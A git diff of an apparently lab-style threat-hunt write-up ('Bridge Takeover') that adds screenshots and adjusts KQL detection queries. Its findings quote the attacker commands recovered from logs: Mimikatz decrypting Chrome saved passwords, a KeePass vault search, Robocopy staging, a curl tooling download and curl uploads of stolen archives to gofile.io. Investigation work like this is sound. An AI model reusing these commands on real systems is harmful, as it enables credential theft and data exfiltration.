@@ -1,4 +1,4 @@
-# 🌉 Threat Hunt SAGA#3: Bridge Takeover
+<img width="1110" height="72" alt="image" src="https://github.com/user-attachments/assets/95a9eab7-e571-4014-80c0-f9f314ced681" /># 🌉 Threat Hunt SAGA#3: Bridge Takeover
 
 <!-- cover image: upload to the PR and paste the <img> line here -->
 
@@ -503,7 +503,8 @@ DeviceProcessEvents
 
 **Output:** `net localgroup Administrators yuki.tanaka2 /add`  
 **Finding:** Look in InitiatingProcessCommandLine for powershell.exe
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1257" height="203" alt="image" src="https://github.com/user-attachments/assets/f6af7493-35a4-4f8d-b636-af9fb2e68ee1" />
+<img width="712" height="544" alt="image" src="https://github.com/user-attachments/assets/0b439cd4-1c78-409c-bbbc-31e6403361a0" />
 
 ---
 
@@ -526,14 +527,14 @@ DeviceProcessEvents
 | where TimeGenerated between (datetime(2025-11-24) .. datetime(2026-11-25))
 | where AccountName contains "yuki.tanaka"
 | where AccountDomain contains 'Admin'
-| where ProcessCommandLine contains "RDP"
+| where FileName has_any ("query.exe", "qwinsta.exe", "quser.exe", "cmd.exe","powershell.exe")
 | project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
 | order by TimeGenerated
 ```
 
 **Output:** `qwinsta.exe`  
 **Finding:** Re-run the query without restricting to ProcessCommandLine contains "RDP" literally — that filter is pulling in unrelated Edge WebView2
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1101" height="314" alt="image" src="https://github.com/user-attachments/assets/8b224978-deaf-4e4f-83f2-ff439bfa1dd0" />
 
 ---
 
@@ -562,7 +563,7 @@ DeviceProcessEvents
 
 **Output:** `"nltest.exe" /domain_trusts /all_trusts`  
 **Finding:** Both rows show FileName nltest.exe executed with ProcessCommandLine "nltest.exe" /domain_trusts /all_trusts, run by account yuki.tanaka,
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1150" height="105" alt="image" src="https://github.com/user-attachments/assets/d95100f0-87f1-4a73-b4b8-16ffa48d707a" />
 
 ---
 
@@ -590,7 +591,7 @@ DeviceProcessEvents
 
 **Output:** `"NETSTAT.EXE" -ano`  
 **Finding:** In DeviceProcessEvents, filter AccountName for the compromised user and FileName/ProcessCommandLine for native Windows TCP/IP stack
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1110" height="72" alt="image" src="https://github.com/user-attachments/assets/cd059297-0afa-4abd-b791-401b4fd7ccb2" />
 
 ---
 
@@ -618,7 +619,7 @@ DeviceProcessEvents
 
 **Output:** `"cmd.exe" /c where /r C:\Users *.kdbx`  
 **Finding:** Single-row result matching a recursive-search filter, on the compromised account, correlated in time and parent process with two confirmed recon commands, is the intended answer. My confidence is in the *method*, not in any value I'm naming. Parsing it piece by piece: cmd.exe /c runs one command then exits; "where" is the built-in Windows file-locator LOLBin; /r C:\Users forces recursion through every user profile; *.kdbx is the KeePass password database extension. That is precisely a discovery action against encrypted credential storage.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1103" height="71" alt="image" src="https://github.com/user-attachments/assets/1c640ca6-d41a-4a46-9a85-765ed85eaa51" />
 
 ---
 
@@ -647,7 +648,7 @@ DeviceFileEvents
 
 **Output:** `OLD-Passwords.lnk`  
 **Finding:** The result set is 13 Explorer.EXE-driven `FileCreated` events on azuki-adminpc, all under the `yuki.tanaka` profile. Eleven of them land in `C: Users\yuki.tanaka\AppData\Roaming\Microsoft\Windows\Recent\`, which is Windows' automatic shortcut store — a `.lnk` gets written there whenever a file is opened through Explorer. So each filename in that folder is a record of something the attacker actually opened.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1319" height="346" alt="image" src="https://github.com/user-attachments/assets/d254e29c-3a62-4a4b-8e89-db0c78c99da1" />
 
 ---
 
@@ -677,7 +678,7 @@ DeviceFileEvents
 
 **Output:** `C:\ProgramData\Microsoft\Crypto\staging`  
 **Finding:** Directly continues the credential-theft chain from Flag 15 and Flag 16. Flag 15 was "cmd.exe" /c where /r C:\Users *.kdbx — a hunt for
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1264" height="338" alt="image" src="https://github.com/user-attachments/assets/307285ef-a744-46a6-b52d-075db7533a5d" />
 
 ---
 
@@ -706,7 +707,7 @@ DeviceProcessEvents
 
 **Output:** `"Robocopy.exe" C:\Users\yuki.tanaka\Documents\Banking C:\ProgramData\Microsoft\Crypto\staging\Banking /E /R:1 /W:1 /NP`  
 **Finding:** Filter FileName to the Windows copy utilities — robocopy.exe, xcopy.exe, and cmd.exe — then search ProcessCommandLine for the staging path from Flag 17 and for words like bank, financial, statement, invoice, or Documents. Also try searching ProcessCommandLine alone for the staging path with no filename filter, in case the copy ran inside a script or a PowerShell one-liner. Sort by TimeGenerated ascending and stay in the same window as the earlier flags. When you find it, take the command line verbatim, switches and all — the flag wants the whole string, not a paraphrase.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1273" height="150" alt="image" src="https://github.com/user-attachments/assets/56285949-c1a9-473f-82ca-d9ef2944ca42" />
 
 ---
 
@@ -736,7 +737,7 @@ DeviceFileEvents
 
 **Output:** `8`  
 **Finding:** `All-Contracts-2022.zip` existed at `C:\Users\yuki.tanaka\Documents\Contracts\Archive\`. The file at `C \ProgramData\Microsoft\Crypto\staging\Contracts\Archive\All-Contracts-2022.zip` is a **different file object**, on a different path, with its own MFT record, created at 04:37:49 on 25 Nov 2025 by the attacker's Robocopy process. It is not the same file. It's a new archive that the attacker brought into existence inside his own staging area. That's what the `staging` filter is telling you to count: archives that exist in the exfil staging directory as a result of this intrusion. All 8 qualify.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1024" height="305" alt="image" src="https://github.com/user-attachments/assets/50ae13f8-b494-4717-8e75-a9a885f90420" />
 
 ---
 
@@ -758,15 +759,14 @@ DeviceFileEvents
 DeviceProcessEvents
 | where TimeGenerated > datetime(2025-11-25T04:15:57.3989346Z)
 | where DeviceName contains "azuki-adminpc"
-| where ProcessCommandLine has_any ("curl", "scp", "sftp", "tftp", "rsync", "finger", "wget", "winget", "yum")
-//| where ProcessCommandLine has_any ("Invoke-WebRequest", "DownloadFile", "DownloadString", "certutil")
+| where ProcessCommandLine has_any ("curl")
 | project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
 | order by TimeGenerated asc
 ```
 
 **Output:** `"curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z`  
 **Finding:** Of the nine curl commands, only two are actual downloads — rows 1 and 8 use `-L -o`, which writes a remote file to disk, while the other seven use `-X POST -F file=@`, which uploads. That knocks out the decoys like `credentials.tar.gz`, which are stolen data leaving, not tools arriving. Row 1 at 04:21 is the initial dropper, disguised as a Windows patch (`KB5044273-x64.7z`) and already attributed to the meterpreter implant by your earlier flags. That leaves row 8 at 05:55:34, pulling `m-temp.7z` from the same catbox.moe host the attacker had already established — the infrastructure reuse the hint pointed at. The clincher is what happens 76 seconds later: row 9 uploads `chrome-session-theft.tar.gz`. Chrome session tokens are DPAPI-encrypted and cannot be grabbed by the Robocopy staging that produced all the earlier archives, so a new capability landed on that box between 04:49 and 05:55, and row 8 is the only thing that landed. Hen
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1175" height="299" alt="image" src="https://github.com/user-attachments/assets/f78a7090-3470-4381-8978-0aa0e02a35a8" />
 
 ---
 
@@ -795,7 +795,7 @@ DeviceProcessEvents
 
 **Output:** `"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit`  
 **Finding:** It's the answer because it's the only command that actually steals the passwords. The `::` syntax is Mimikatz, and the modules do one specific job: `privilege::debug` grabs the privilege needed for DPAPI work, `dpapi::chrome` reads Chrome's password store, `/in:...\Login Data` points at the file holding saved logins, and `/unprotect` decrypts them. It ran as the compromised user `yuki.tanaka` from `C:\Windows\Temp\cache\`, the staging folder from the archive in Flag 20, under a renamed one-letter binary to avoid detection. The other two rows don't qualify — `sc.exe start pushtoinstall login` is normal Windows Update noise running as `system`, and the `tar.exe` command only zips up `chrome-creds.txt` and `Chrome-Login-Data.db`, which are the files this Mimikatz command produced in the first place.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1285" height="129" alt="image" src="https://github.com/user-attachments/assets/3ffa6eaf-2369-4cf7-af4a-fff6002375cd" />
 
 ---
 
@@ -822,7 +822,7 @@ DeviceProcessEvents
 
 **Output:** `"curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile`  
 **Finding:** Nine curl runs on azuki-adminpc split into two shapes: two downloads using `-L -o` (pulling `.7z` tooling from catbox) and seven uploads using `-X POST -F file=@<archive>` to the gofile upload endpoint. The `@` prefix is what makes the uploads exfiltration — it tells curl to read the file off disk and attach it as multipart form data, so the archive goes out the wire. Within those seven, the earliest timestamp is 04:41:51, so the first archive exfiltrated was `credentials.tar.gz` to the url: https://store1.gofile.io/uploadFile.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1275" height="296" alt="image" src="https://github.com/user-attachments/assets/a734be6c-bcb1-4207-a394-18b2eda04fce" />
 
 ---
 
@@ -850,7 +850,7 @@ DeviceNetworkEvents
 
 **Output:** `gofile.io`  
 **Finding:** Filtering `DeviceNetworkEvents` on azuki-adminpc for `curl.exe` returns two connections, both successful on port 443. One is `litter.catbox.moe` using `-L -o` to write a file to local disk — that's the attacker pulling tooling *in*. The other is row 18: `"curl.exe" -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile`, hitting `store1.gofile.io` at 45.112.123.227. The `-F file=@` flag means a file was being pushed *out*, so that's the exfiltration. Strip the `https://` and the `/uploadFile` path and you get the hostname `store1.gofile.io`; `store1` is just a numbered storage node that Gofile rotates between uploads, so it identifies a server, not the service. The registrable domain — and the two-part value the flag format asks for — is **`gofile.io`**.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1212" height="98" alt="image" src="https://github.com/user-attachments/assets/1a920285-47b3-4a36-bbd0-a7af1251a141" />
 
 ---
 
@@ -879,7 +879,7 @@ DeviceNetworkEvents
 
 **Output:** `45.112.123.227`  
 **Finding:** Same process as the previous flag. We are merely searching for the RemoteURL field for the address of the service domain of the exfiltration.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1223" height="97" alt="image" src="https://github.com/user-attachments/assets/f896d309-8774-4d02-8107-3354e6e62930" />
 
 ---
 
@@ -907,7 +907,7 @@ DeviceFileEvents
 
 **Output:** `KeePass-Master-Password.txt`  
 **Finding:** The tar command shows exactly what the attacker packed into the stolen archive: `tar.exe -czf credentials.tar.gz Azuki-Passwords.kdbx KeePass-Master-Password.txt`. Everything after the archive name is a file going *into* the bundle — so the attacker grabbed two things, the locked KeePass vault (`.kdbx`) and a plain text file named `KeePass-Master-Password.txt`. A vault is useless without its master password, so pairing them is the whole point. That `.txt` is the only text file in the command, its name says what's in it, and it matches the expected `filename.txt` format. `credentials.tar.gz` is just the box it was shipped in, not the file holding the password.
-<!-- screenshot: upload to the GitHub PR and paste the <img> line here -->
+<img width="1278" height="72" alt="image" src="https://github.com/user-attachments/assets/5e844220-665d-4400-ab36-09b188d80261" />
 
 ---
 
